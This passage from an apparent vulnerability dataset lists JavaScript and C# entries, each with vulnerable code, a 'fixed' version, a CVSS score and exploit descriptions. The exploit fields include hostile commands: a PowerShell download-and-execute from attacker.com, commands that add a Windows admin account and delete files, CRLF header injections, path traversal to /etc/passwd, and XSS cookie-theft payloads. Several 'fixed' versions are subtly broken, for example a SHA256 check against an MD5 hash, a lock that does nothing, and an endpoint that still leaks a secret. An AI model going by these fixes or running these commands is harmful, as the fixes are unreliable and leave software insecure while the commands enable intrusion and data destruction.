        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "class SessionManager {\n    constructor() {\n        this.sessions = {};\n    }\n\n    createSession(userId) {\n        const sessionId = this.generateSessionId();\n        this.sessions[sessionId] = { userId, createdAt: new Date() };\n        return sessionId;\n    }\n\n    generateSessionId() {\n        return Math.random().toString(36).substr(2, 16);\n    }\n\n    getSession(userId) {\n        for (const sessionId in this.sessions) {\n            if (this.sessions[sessionId].userId === userId) {\n                return sessionId;\n            }\n        }\n        return null;\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "class SessionManager {\n    constructor() {\n        this.sessions = {};\n    }\n\n    createSession(userId) {\n        const sessionId = this.generateSecureSessionId();\n        this.sessions[sessionId] = { userId, createdAt: new Date() };\n        return sessionId;\n    }\n\n    generateSecureSessionId() {\n        const crypto = require('crypto');\n        return crypto.randomBytes(16).toString('hex');\n    }\n\n    getSession(userId) {\n        for (const sessionId in this.sessions) {\n            if (this.sessions[sessionId].userId === userId) {\n                return sessionId;\n            }\n        }\n        return null;\n    }\n}",
        "exploit_ways": [
            "An attacker could set a session cookie to an existing session ID, potentially hijacking the user's session.",
            "By observing sessions in transit, an attacker might predict and use a predictable session ID to gain unauthorized access.",
            "In environments with shared machines, an attacker could set a session ID on a machine before the legitimate user logs in."
        ]
    },
    "javascript_30": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "class WebApp {\\n    constructor() {\\n        this.headers = {};\\n    }\\n\\n    setHeader(name, value) {\\n        if (name.toLowerCase() !== 'content-security-policy') {\\n            this.headers[name] = value;\\n        }\\n    }\\n}",
        "cvss_score": 4.3,
        "fixed_code": "class WebApp {\\n    constructor() {\\n        this.headers = {};\\n    }\\n\\n    setHeader(name, value) {\\n        const requiredHeaders = ['content-security-policy', 'x-frame-options', 'x-content-type-options'];\\n        if (requiredHeaders.includes(name.toLowerCase())) {\\n            this.headers[name] = value;\\n        } else {\\n            console.warn(`Setting non-required header: ${name}`);\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker can inject arbitrary headers, leading to clickjacking attacks if X-Frame-Options is not set.",
            "Without Content-Security-Policy (CSP), the application may be vulnerable to cross-site scripting (XSS) attacks.",
            "The absence of X-Content-Type-Options: nosniff header makes the application susceptible to MIME type sniffing vulnerabilities."
        ]
    },
    "javascript_31": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "function updateBalance(account, amount) {\n    setTimeout(function() {\n        account.balance += amount;\n        console.log('Updated balance:', account.balance);\n    }, 100);\n}",
        "cvss_score": 5.3,
        "fixed_code": "function updateBalance(account, amount) {\n    return new Promise((resolve) => {\n        setTimeout(() => {\n            account.balance += amount;\n            console.log('Updated balance:', account.balance);\n            resolve();\n        }, 100);\n    });\n}",
        "exploit_ways": [
            "An attacker could exploit the race condition to perform multiple updates in a short time, leading to an incorrect final balance.",
            "By manipulating timing, an attacker might be able to cause transactions to overwrite each other's results.",
            "In some cases, the delay could lead to security checks being bypassed if they rely on the immediate state of account.balance."
        ]
    },
    "javascript_32": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "class UserProfile {\n    constructor(name, email) {\n        this.name = name;\n        this.email = email;\n        this.secretInfo = \"This is a secret.\";\n    }\n\n    getSecretInfo() {\n        return this.secretInfo;\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "class UserProfile {\n    constructor(name, email) {\n        this.name = name;\n        this.email = email;\n        const secretInfo = \"This is a secret.\";\n\n        this.getSecretInfo = function() {\n            // Assuming proper authorization before returning\n            if (this.isAuthorized()) {\n                return secretInfo;\n            }\n            throw new Error(\"Unauthorized access\");\n        };\n    }\n\n    isAuthorized() {\n        // Placeholder for actual authorization logic\n        return false;\n    }\n}",
        "exploit_ways": [
            "An attacker can call getSecretInfo to obtain sensitive information if not properly restricted.",
            "By accessing the instance, unauthorized users might directly read secretInfo if no encapsulation is applied.",
            "If part of a larger system, the secret information could be leaked via API endpoints that improperly expose this data."
        ]
    },
    "javascript_33": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "class ClickjackFrame {\n    constructor(url) {\n        this.frame = document.createElement('iframe');\n        this.frame.src = url;\n        this.frame.style.position = 'absolute';\n        this.frame.style.top = '0';\n        this.frame.style.left = '0';\n        this.frame.style.width = '100%';\n        this.frame.style.height = '100%';\n        this.frame.style.border = 'none';\n        document.body.appendChild(this.frame);\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "class ClickjackFrame {\n    constructor(url) {\n        this.frame = document.createElement('iframe');\n        this.frame.src = url;\n        this.frame.style.position = 'absolute';\n        this.frame.style.top = '0';\n        this.frame.style.left = '0';\n        this.frame.style.width = '100%';\n        this.frame.style.height = '100%';\n        this.frame.style.border = 'none';\n        this.frame.sandbox = '';\n        document.body.appendChild(this.frame);\n    }\n}",
        "exploit_ways": [
            "An attacker can overlay a transparent iframe over legitimate content to capture clicks.",
            "Users may unknowingly interact with the malicious iframe, potentially leading to unintended actions.",
            "The vulnerability allows attackers to trick users into clicking buttons on behalf of them."
        ]
    },
    "javascript_34": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "class InfiniteLoop {\n    constructor() {}\n    start() {\n        while(true) {}\n    }\n}",
        "cvss_score": 3.0,
        "fixed_code": "class LimitedLoop {\n    constructor(maxIterations = 1000) {\n        this.maxIterations = maxIterations;\n    }\n    start() {\n        for (let i = 0; i < this.maxIterations; i++) {}\n    }\n}",
        "exploit_ways": [
            "An attacker can instantiate the InfiniteLoop class and call start(), causing the server to hang indefinitely.",
            "If running in a web environment, this could lead to resource exhaustion, making the application unresponsive.",
            "In some environments, continuous execution could lead to increased CPU usage, affecting performance."
        ]
    },
    "javascript_35": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "function sendUserFeedback(feedback) {\n    var xhr = new XMLHttpRequest();\n    xhr.open('POST', '/submit_feedback.php', true);\n    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n    xhr.send('user=' + encodeURIComponent(feedback));\n}",
        "cvss_score": 6.1,
        "fixed_code": "function sendUserFeedback(feedback) {\n    var xhr = new XMLHttpRequest();\n    xhr.open('POST', '/submit_feedback.php', true);\n    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n    // Sanitize feedback to prevent HTTP response splitting\n    var sanitizedFeedback = feedback.replace(/\\r|\\n/g, '');\n    xhr.send('user=' + encodeURIComponent(sanitizedFeedback));\n}",
        "exploit_ways": [
            "An attacker could inject '\\r\\nSet-Cookie: admin=true' to manipulate cookies.",
            "By inserting '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Malicious Content</body></html>' the server might send unintended responses.",
            "Injecting '\\r\\nLocation: http://attacker.com' could redirect users to a malicious site."
        ]
    },
    "javascript_36": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst sensitiveData = {\n    secretKey: '12345',\n    userCredentials: {\n        username: 'admin',\n        password: 'password'\n    }\n};\n\napp.get('/info', (req, res) => {\n    try {\n        const key = req.query.key;\n        if (!key) throw new Error('Key is required');\n        const value = sensitiveData[key];\n        if (value === undefined) throw new Error('Invalid key');\n        res.json({ [key]: value });\n    } catch (error) {\n        res.status(400).json({ error: error.message });\n    }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));",
        "cvss_score": 2.5,
        "fixed_code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst sensitiveData = {\n    secretKey: '12345',\n    userCredentials: {\n        username: 'admin',\n        password: 'password'\n    }\n};\n\nconst allowedKeys = ['secretKey'];\n\napp.get('/info', (req, res) => {\n    try {\n        const key = req.query.key;\n        if (!key || !allowedKeys.includes(key)) throw new Error('Invalid or unauthorized key');\n        res.json({ [key]: sensitiveData[key] });\n    } catch (error) {\n        res.status(400).json({ error: error.message });\n    }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));",
        "exploit_ways": [
            "An attacker can request /info?key=secretKey to retrieve the secret key.",
            "They could try /info?key=userCredentials to access username and password if not properly restricted.",
            "Exploiting this, an attacker might infer internal structure by trying different keys."
        ]
    },
    "javascript_37": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "class DataFetcher {\\n    constructor(url) {\\n        this.url = url;\\n    }\\n\\n    fetch() {\\n        const xhr = new XMLHttpRequest();\\n        xhr.open('GET', 'https:\\/\\/api.example.com\\/data?' + this.url.split('=')[1], true);\\n        xhr.send();\\n    }\\n}",
        "cvss_score": 5.3,
        "fixed_code": "class DataFetcher {\\n    constructor(url) {\\n        const allowedDomain = 'https://api.example.com';\\n        if (!url.startsWith(allowedDomain)) {\\n            throw new Error('Invalid URL');\\n        }\\n        this.url = url;\\n    }\\n\\n    fetch() {\\n        const xhr = new XMLHttpRequest();\\n        xhr.open('GET', this.url, true);\\n        xhr.send();\\n    }\\n}",
        "exploit_ways": [
            "An attacker could modify the URL to point to an internal network resource like 'https://internal-api.example.com/data'.",
            "The attacker might use the vulnerability to request sensitive data from other domains if they can control the input parameter.",
            "By injecting a malicious URL, attackers could attempt to perform actions on behalf of the server, such as downloading files or sending requests to external servers."
        ]
    },
    "javascript_38": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "class URLHandler {\n    constructor(url) {\n        this.url = url;\n    }\n\n    redirect() {\n        window.location.href = this.url;\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "class URLHandler {\n    constructor(url) {\n        const allowedDomains = ['example.com', 'sub.example.com'];\n        if (allowedDomains.some(domain => url.includes(domain))) {\n            this.url = url;\n        } else {\n            throw new Error('Invalid URL');\n        }\n    }\n\n    redirect() {\n        window.location.href = this.url;\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'http://malicious.com' to redirect users to an unauthorized site.",
            "By appending URLs, attackers could craft a link that redirects users to phishing sites or malware downloads, e.g., 'https://legitimate.com/redirect?url=http%3A%2F%2Fphishing.com'.",
            "Malicious actors can use the vulnerability to redirect users from secure HTTPS pages to insecure HTTP pages, compromising data security."
        ]
    },
    "javascript_39": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "class DataFetcher {\n    constructor(url) {\n        this.url = url;\n    }\n\n    fetchData(path) {\n        const fullUrl = new URL(path, this.url);\n        fetch(fullUrl).then(response => response.text()).then(data => console.log(data));\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "class DataFetcher {\n    constructor(baseURL) {\n        this.baseURL = new URL(baseURL);\n    }\n\n    fetchData(path) {\n        const allowedHost = this.baseURL.hostname;\n        const fullUrl = new URL(path, this.baseURL);\n        if (fullUrl.hostname !== allowedHost) {\n            throw new Error('Invalid host');\n        }\n        fetch(fullUrl).then(response => response.text()).then(data => console.log(data));\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a path like 'http://attacker.com/malicious-data' to exfiltrate internal data.",
            "They could use a relative URL to access internal resources not meant for public consumption, such as '/admin/config'.",
            "Crafting a URL with port numbers targeting internal services like 'http://localhost:8080/secret.txt' can lead to sensitive information disclosure."
        ]
    },
    "javascript_40": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Clickjacking Example</title>\n    <style>\n        #overlay {\n            position: absolute;\n            top: 5px;\n            left: 5px;\n            width: 200px;\n            height: 200px;\n            opacity: 0.3;\n            z-index: 1000;\n        }\n    </style>\n</head>\n<body>\n    <button id=\"visibleButton\" onclick=\"alert('You clicked the visible button!');\">Click Me!</button>\n    <div id=\"overlay\">\n        <iframe src=\"https://example.com/hidden-clickable-area\" width=\"200\" height=\"200\" frameborder=\"0\"></iframe>\n    </div>\n</body>\n</html>",
        "cvss_score": 3.5,
        "fixed_code": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Clickjacking Example</title>\n    <style>\n        #overlay {\n            position: absolute;\n            top: 5px;\n            left: 5px;\n            width: 200px;\n            height: 200px;\n            opacity: 0.3;\n            z-index: 1000;\n        }\n    </style>\n    <script>\n        document.addEventListener('click', function(event) {\n            if (event.target.id === 'visibleButton') {\n                alert('You clicked the visible button!');\n            }\n        });\n    </script>\n</head>\n<body>\n    <button id=\"visibleButton\">Click Me!</button>\n</body>\n</html>",
        "exploit_ways": [
            "An attacker could place a hidden iframe over the visible button to redirect clicks to another action.",
            "Users clicking the visible button could inadvertently trigger actions on the hidden iframe, like unintended purchases or data submissions.",
            "The overlay can be styled to cover critical buttons on legitimate websites, leading to unauthorized actions."
        ]
    },
    "javascript_41": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "function safeRedirect(url) {\n    const allowedDomains = [\"example.com\", \"safe.example.org\"];\n    const parsedUrl = new URL(url);\n    if (allowedDomains.includes(parsedUrl.hostname)) {\n        window.location.href = url;\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "function safeRedirect(url) {\n    const allowedDomains = [\"example.com\", \"safe.example.org\"];\n    const parsedUrl = new URL(url);\n    if (allowedDomains.includes(parsedUrl.hostname)) {\n        window.location.href = encodeURIComponent(url);\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL with an allowed domain to redirect users to phishing sites.",
            "Attackers could craft URLs that include additional parameters or query strings to manipulate the redirection process.",
            "Users can be redirected to download malware if they follow a crafted link targeting an allowed domain."
        ]
    },
    "javascript_42": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "\"use strict\";\n\nconst fs = require('fs');\nconst express = require('express');\nconst app = express();\n\napp.get('/file', (req, res) => {\n    const filePath = req.query.file || 'default.txt';\n    fs.readFile(filePath, 'utf8', (err, data) => {\n        if (err) {\n            return res.status(500).send('Error reading file');\n        }\n        res.send(data);\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server running on http://localhost:3000/');\n});",
        "cvss_score": 5.4,
        "fixed_code": "\"use strict\";\n\nconst fs = require('fs');\nconst express = require('express');\nconst path = require('path');\nconst app = express();\n\napp.get('/file', (req, res) => {\n    const safePath = path.join(__dirname, 'files', req.query.file || 'default.txt');\n    if (!safePath.startsWith(path.resolve(__dirname + '/files'))) {\n        return res.status(403).send('Forbidden');\n    }\n    fs.readFile(safePath, 'utf8', (err, data) => {\n        if (err) {\n            return res.status(500).send('Error reading file');\n        }\n        res.send(data);\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server running on http://localhost:3000/');\n});",
        "exploit_ways": [
            "An attacker could request /file?file=../../../../etc/passwd to read the system's password file.",
            "They might attempt to fetch sensitive server-side files by manipulating the 'file' parameter with path traversal techniques.",
            "By exploiting LFI, an attacker can potentially access any readable file on the server within the same filesystem."
        ]
    },
    "javascript_43": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "function infiniteLoop() { while(true) {} } infiniteLoop();",
        "cvss_score": 4.2,
        "fixed_code": "function limitedLoop() { for(let i = 0; i < 1000; i++) {} } limitedLoop();",
        "exploit_ways": [
            "An attacker can call the infiniteLoop function to freeze the application indefinitely.",
            "If this code runs on a server, it could exhaust CPU resources leading to DoS for other users.",
            "In web contexts, this can make the page unresponsive, preventing user interaction."
        ]
    },
    "javascript_44": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "class InfiniteLoop {\n    start() {\n        while (true) {}\n    }\n}",
        "cvss_score": 3.0,
        "fixed_code": "class LimitedLoop {\n    start(limit) {\n        for (let i = 0; i < limit; i++) {}\n    }\n}",
        "exploit_ways": [
            "An attacker can call the start method to freeze the application indefinitely.",
            "If integrated into a server, this can cause denial of service by blocking other operations.",
            "Could be used in testing environments to intentionally halt execution for debugging."
        ]
    },
    "javascript_45": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "function sendUserFeedback(feedback) {\n    const xhr = new XMLHttpRequest();\n    xhr.open(\"POST\", \"/submit_feedback\", true);\n    xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n    xhr.send(\"user_feedback=\" + feedback);\n}",
        "cvss_score": 6.1,
        "fixed_code": "function sendUserFeedback(feedback) {\n    const xhr = new XMLHttpRequest();\n    xhr.open(\"POST\", \"/submit_feedback\", true);\n    xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n    xhr.send(\"user_feedback=\" + encodeURIComponent(feedback));\n}",
        "exploit_ways": [
            "An attacker can inject CRLF sequences (\\r\\n) to manipulate HTTP headers or responses.",
            "Could use the injection to perform cache poisoning attacks on intermediate caches.",
            "Inject JavaScript code via specially crafted feedback to perform XSS if other parts of the application are vulnerable."
        ]
    },
    "javascript_46": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "function updateBalance(newBalance) {\n    setTimeout(() => {\n        this.balance = newBalance;\n    }, 100);\n}",
        "cvss_score": 6.5,
        "fixed_code": "function updateBalance(newBalance) {\n    const lock = Symbol('lock');\n    if (!this[lock]) {\n        this[lock] = true;\n        setTimeout(() => {\n            this.balance = newBalance;\n            delete this[lock];\n        }, 100);\n    }\n}",
        "exploit_ways": [
            "An attacker could repeatedly call updateBalance in quick succession to cause inconsistent state.",
            "By timing the calls precisely, an attacker might prevent a critical balance check from occurring correctly.",
            "In a multi-user environment, race conditions can lead to incorrect balance calculations or unauthorized transactions."
        ]
    },
    "javascript_47": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Clickjacking Example</title>\n    <style>\n        #overlay {\n            position: absolute;\n            top: 50px;\n            left: 50px;\n            width: 200px;\n            height: 100px;\n            opacity: 0.3;\n            z-index: 2;\n        }\n    </style>\n</head>\n<body>\n    <div id=\"overlay\"><a href=\"http://malicious.com\"></a></div>\n    <iframe src=\"https://legitimate-website.com\" width=\"400px\" height=\"300px\"></iframe>\n</body>\n</html>",
        "cvss_score": 3.8,
        "fixed_code": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Clickjacking Example</title>\n    <style>\n        #overlay {\n            position: absolute;\n            top: 50px;\n            left: 50px;\n            width: 200px;\n            height: 100px;\n            opacity: 0.3;\n            z-index: 2;\n        }\n    </style>\n    <meta http-equiv=\"X-Frame-Options\" content=\"SAMEORIGIN\">\n</head>\n<body>\n    <div id=\"overlay\"><a href=\"http://malicious.com\"></a></div>\n    <iframe src=\"https://legitimate-website.com\" width=\"400px\" height=\"300px\"></iframe>\n</body>\n</html>",
        "exploit_ways": [
            "An attacker can trick users into clicking the overlay, which redirects them to a malicious site.",
            "The iframe could be used to perform actions on behalf of the user without their knowledge.",
            "Attackers might hide the legitimate content behind the overlay, leading to unintentional interactions with malicious elements."
        ]
    },
    "javascript_48": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "function updateBalance(newAmount) {\n    setTimeout(() => {\n        let currentBalance = getBalance();\n        setBalance(currentBalance + newAmount);\n    }, 1000);\n}",
        "cvss_score": 5.3,
        "fixed_code": "function updateBalance(newAmount) {\n    const balancePromise = getBalanceAsync();\n    balancePromise.then(currentBalance => {\n        setBalance(currentBalance + newAmount);\n    });\n}\n\nfunction getBalanceAsync() {\n    return new Promise((resolve, reject) => {\n        setTimeout(() => {\n            resolve(getBalance());\n        }, 1000);\n    });\n}",
        "exploit_ways": [
            "An attacker could manipulate the timing of multiple transactions to exploit inconsistent balance updates.",
            "By initiating simultaneous balance updates, an attacker might cause incorrect calculations leading to unauthorized gains or losses.",
            "Using precise timing attacks, an attacker could potentially reset balances by overlapping update operations."
        ]
    },
    "javascript_49": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "const fs = require('fs');\nfunction readFileContent(filePath) {\n    const safePath = \"/safe/directory/\" + encodeURIComponent(filePath.split('/').pop());\n    fs.readFile(safePath, 'utf8', (err, data) => {\n        if (err) throw err;\n        console.log(data);\n    });\n}",
        "cvss_score": 5.0,
        "fixed_code": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFileContent(filePath) {\n    const baseDirectory = \"/safe/directory/\";\n    const safePath = path.join(baseDirectory, path.basename(filePath));\n    if (safePath.startsWith(baseDirectory)) {\n        fs.readFile(safePath, 'utf8', (err, data) => {\n            if (err) throw err;\n            console.log(data);\n        });\n    } else {\n        throw new Error('Invalid file path');\n    }\n}",
        "exploit_ways": [
            "An attacker could attempt to traverse directories using '..' in the filePath input to access files outside /safe/directory/.",
            "If not properly sanitized, special characters or encoded sequences can be used to manipulate the filePath parameter to read unauthorized files.",
            "Exploiting symlink vulnerabilities if symlinks point to sensitive files within the restricted directory."
        ]
    },
    "c#_0": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "using System;\nusing System.IO;\nusing System.Runtime.Serialization.Formatters.Binary;\nclass VulnerableClass {\n    public static void DeserializeObject(string filePath) {\n        BinaryFormatter formatter = new BinaryFormatter();\n        using (FileStream stream = new FileStream(filePath, FileMode.Open)) {\n            object obj = formatter.Deserialize(stream);\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\nusing System.IO;\nusing Newtonsoft.Json;\nclass SecureClass {\n    public static void DeserializeObject(string filePath) {\n        string json;\n        using (StreamReader stream = new StreamReader(filePath)) {\n            json = stream.ReadToEnd();\n        }\n        object obj = JsonConvert.DeserializeObject(json);\n    }\n}",
        "exploit_ways": [
            "An attacker can craft a malicious serialized object to execute arbitrary code.",
            "Could use deserialization to perform remote code execution if the object graph is manipulated.",
            "By injecting specially crafted data, an attacker might be able to achieve denial of service by crashing the application."
        ]
    },
    "c#_1": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "using System.Security.Principal;\npublic class Exploit {\n    public void CheckPrivileges() {\n        WindowsIdentity identity = WindowsIdentity.GetCurrent();\n        WindowsPrincipal principal = new WindowsPrincipal(identity);\n        if (!principal.IsInRole(WindowsBuiltInRole.Administrator)) {\n            // Simulate a hard to detect privilege escalation attempt\n            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(\"cmd.exe\", \"/c net user hacker Hacker123! /add\"));\n        }\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "using System.Security.Principal;\npublic class Exploit {\n    public void CheckPrivileges() {\n        WindowsIdentity identity = WindowsIdentity.GetCurrent();\n        WindowsPrincipal principal = new WindowsPrincipal(identity);\n        if (!principal.IsInRole(WindowsBuiltInRole.Administrator)) {\n            throw new UnauthorizedAccessException(\"User does not have the necessary privileges.\");\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can execute CheckPrivileges() to create a new admin user named 'hacker' with password 'Hacker123!'.",
            "If run in an automated context, it could be used to add unauthorized users regularly.",
            "This method can be triggered by any non-admin user to escalate their privileges."
        ]
    },
    "c#_2": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "using System;\nclass VulnerableClass {\n    public unsafe void UnsafeMethod() {\n        char* buffer = stackalloc char[16];\n        Console.WriteLine(\"Enter a string:\");\n        string input = Console.ReadLine();\n        for (int i = 0; i < input.Length; i++) {\n            buffer[i] = input[i];\n        }\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "using System;\nclass SafeClass {\n    public void SafeMethod() {\n        Console.WriteLine(\"Enter a string:\");\n        string input = Console.ReadLine();\n        char[] buffer = new char[16];\n        int length = Math.Min(input.Length, 16);\n        for (int i = 0; i < length; i++) {\n            buffer[i] = input[i];\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a string longer than 16 characters to overwrite adjacent memory locations.",
            "By carefully crafting the input, an attacker could execute arbitrary code using return address overwriting.",
            "This vulnerability might allow for privilege escalation if exploited correctly within a privileged application context."
        ]
    },
    "c#_3": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "using System.Security.Cryptography;\nusing System.Text;\nusing System.Linq;\nusing System.Collections.Generic;\nusing System.Diagnostics;\nusing System.Numerics;\nusing System;\nclass AuthenticationManager {\n    private string _hashedPassword = \"e10adc3949ba59abbe56e057f20f883e\"; // Hash for \\\"password123\\\"\n\n    public bool Authenticate(string username, string password) {\n        if (username == \\\"admin\\\") {\n            using (SHA1 sha1 = SHA1.Create()) {\n                byte[] hashBytes = sha1.ComputeHash(Encoding.UTF8.GetBytes(password));\n                StringBuilder sb = new StringBuilder();\n                foreach (byte b in hashBytes) {\n                    sb.Append(b.ToString(\\\"x2\\\"));\n                }\n                return _hashedPassword == sb.ToString();\n            }\n        }\n        return false;\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System.Security.Cryptography;\nusing System.Text;\nusing System.Linq;\nusing System.Collections.Generic;\nusing System.Diagnostics;\nusing System.Numerics;\nusing System;\nclass AuthenticationManager {\n    private string _hashedPassword = \"e10adc3949ba59abbe56e057f20f883e\"; // Hash for \\\"password123\\\"\n\n    public bool Authenticate(string username, string password) {\n        if (username == \\\"admin\\\") {\n            using (SHA256 sha256 = SHA256.Create()) {\n                byte[] hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(password));\n                StringBuilder sb = new StringBuilder();\n                foreach (byte b in hashBytes) {\n                    sb.Append(b.ToString(\\\"x2\\\"));\n                }\n                return _hashedPassword == sb.ToString();\n            }\n        }\n        return false;\n    }\n}",
        "exploit_ways": [
            "An attacker can brute-force the password for the admin account using known hash vulnerabilities.",
            "By gaining access to the source code or compiled binaries, an attacker can extract the hardcoded hash and attempt to crack it offline.",
            "If other parts of the application are insecure, an attacker might exploit them to gain access to the server files containing the authentication logic."
        ]
    },
    "c#_4": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "using System;\n\npublic class UnsafeClass {\n    public static void UnsafeFunction() {\n        unsafe {\n            int* ptr = stackalloc int[10];\n            for (int i = 0; i < 20; i++) {\n                ptr[i] = i;\n            }\n        }\n    }\n}",
        "cvss_score": 8.6,
        "fixed_code": "using System;\nusing System.Collections.Generic;\n\npublic class SafeClass {\n    public static void SafeFunction() {\n        List<int> numbers = new List<int>();\n        for (int i = 0; i < 20; i++) {\n            numbers.Add(i);\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could manipulate the input to cause the program to overwrite adjacent memory.",
            "By causing a buffer overflow, an attacker might be able to inject malicious code into the process's memory space.",
            "Exploiting the overflow can lead to control of the execution flow, potentially leading to privilege escalation."
        ]
    },
    "c#_5": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "public void RunCommand(string command) { System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + command); }",
        "cvss_score": 8.2,
        "fixed_code": "public void RunCommand(string command) { string[] allowedCommands = { \"dir\", \"whoami\" }; if (allowedCommands.Contains(command)) { using (Process process = new Process()) { process.StartInfo.FileName = \"cmd.exe\"; process.StartInfo.Arguments = \"/c \" + command; process.StartInfo.UseShellExecute = false; process.Start(); } } else { throw new ArgumentException(\"Command not allowed\"); } }",
        "exploit_ways": [
            "An attacker can input 'takeown /f C:\\\\importantfile.txt' to take ownership of critical files.",
            "They could use 'net user admin Admin123! /add && net localgroup administrators admin /add' to create a new admin account.",
            "Input like 'shutdown /s /t 0' can perform unauthorized system shutdown."
        ]
    },
    "c#_6": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "using System;\n\npublic class Program {\n    public static void Main(string[] args) {\n        Console.WriteLine(\"Enter command:\");\n        string command = Console.ReadLine();\n        System.Diagnostics.Process.Start(command);\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\n\npublic class Program {\n    public static void Main(string[] args) {\n        Console.WriteLine(\"Enter command:\");\n        string command = Console.ReadLine();\n        string[] allowedCommands = { \"dir\", \"echo\" };\n        if (Array.Exists(allowedCommands, element => element == command)) {\n            System.Diagnostics.Process.Start(command);\n        } else {\n            Console.WriteLine(\"Command not allowed.\");\n        }\n    }\n}",
        "exploit_ways": [
            "User could input 'cmd /c del *' to delete all files in the directory.",
            "Could use 'cmd /c powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/malware.ps1')\"' to execute remote malicious PowerShell script.",
            "Could chain commands like 'cmd /c dir & whoami' to list directory contents and reveal current user."
        ]
    },
    "c#_7": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "string GetUnsafeHtml(string userInput) {\n    return \"<div>\" + userInput + \"</div>\";\n}",
        "cvss_score": 6.1,
        "fixed_code": "using System.Web;\n\nstring GetSafeHtml(string userInput) {\n    string safeInput = HttpUtility.HtmlEncode(userInput);\n    return \"<div>\" + safeInput + \"</div>\";\n}",
        "exploit_ways": [
            "An attacker can inject a script like '<script>alert(\\'XSS\\')</script>' to execute arbitrary JavaScript.",
            "Can use '<img src=x onerror=alert(1)>' to trigger the onerror event and run malicious code.",
            "Injecting '<a href=javascript:alert(document.cookie)>Click me</a>' can steal user cookies by prompting them to click."
        ]
    },
    "c#_8": {
        "vulnerability_type": "SQL Injection",
